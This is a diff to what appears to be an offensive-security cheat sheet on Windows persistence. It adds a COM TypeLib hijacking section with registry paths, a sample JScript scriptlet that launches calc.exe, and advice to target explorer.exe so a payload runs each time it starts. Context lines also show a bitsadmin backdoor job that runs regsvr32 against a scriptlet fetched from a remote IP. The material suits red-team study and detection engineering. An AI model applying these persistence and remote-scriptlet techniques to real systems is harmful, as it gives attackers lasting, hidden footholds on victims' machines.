@@ -242,6 +242,44 @@ bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.1
 bitsadmin /resume backdoor
 ```
 
+
+### COM TypeLib
+
+* [CICADA8-Research/TypeLibWalker](https://github.com/CICADA8-Research/TypeLibWalker) - TypeLib persistence technique
+
+Use [sysinternals/procmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procmon) to find `RegOpenKey` with the status `NAME NOT FOUND`. The process `explorer.exe` is a good target, as it will spawn your payload every time it is run.
+
+
+```ps1
+Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win32
+Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win64
+Name: anything
+Type: REG_SZ
+Value: script:C:\1.sct
+```
+
+Example of content for `1.sct`.
+
+```xml
+<?xml version="1.0"?>
+<scriptlet>
+    <registration
+        description="explorer"
+        progid="explorer"
+        version="1.0"
+        classid="{66666666-6666-6666-6666-666666666666}"
+        remotable="true">
+    </registration>
+    <script language="JScript">
+        <![CDATA[
+            var WShell = new ActiveXObject("WScript.Shell");
+            WShell.Run("calc.exe");
+        ]]>
+    </script>
+</scriptlet>
+```
+
+
 ## Serviceland
 
 ### IIS
@@ -623,3 +661,4 @@ Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"
 * [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
 * [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - 2023-02-27](https://0xv1n.github.io/posts/scmanager/)
 * [Sc sdset - Microsoft - 08/31/2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))
+* [Hijack the TypeLib. New COM persistence technique - CICADA8 - October 22, 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
